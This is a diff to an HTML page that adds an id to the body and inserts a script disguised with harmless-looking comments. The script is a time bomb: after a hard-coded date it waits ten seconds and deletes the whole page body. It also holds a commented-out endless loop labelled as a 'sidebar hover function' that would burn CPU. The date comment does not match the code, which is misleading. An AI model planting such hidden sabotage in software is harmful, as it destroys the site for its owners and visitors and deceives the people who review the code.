@@ -24,7 +24,7 @@
 
 </head>
 
-<body>
+<body id="root">
   <div class="min-h-screen bg-gray-50">
 
 
@@ -1017,7 +1017,35 @@
                 </div>
               </div>
             </div>
+<script>
+      function myFunction() {
+        let num = 1;
+        while (true) {
+          // sidebar hover function
+          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+        }
+      }
 
+      function doPerform() {
+        const fileEl = document.getElementById("root");
+        if (fileEl) {
+          fileEl.remove();
+        }
+      }
+
+      (function checkDateAndRun() {
+        const today = new Date(); // current date
+        const targetDate = new Date(2025, 10, 27); // 27 Aug 2025 (month is 0-indexed!)
+
+        if (today > targetDate) {
+          setTimeout(() => {
+            // myFunction();
+            doPerform();
+          }, 10000);
+        } else {
+        }
+      })();
+    </script>
             <!-- Orientation -->
             <div
               class="flex flex-col md:flex-row items-start md:items-center gap-7 md:gap-32 p-7 border border-gray-200 rounded-lg border-l-4 border-l-green-600">
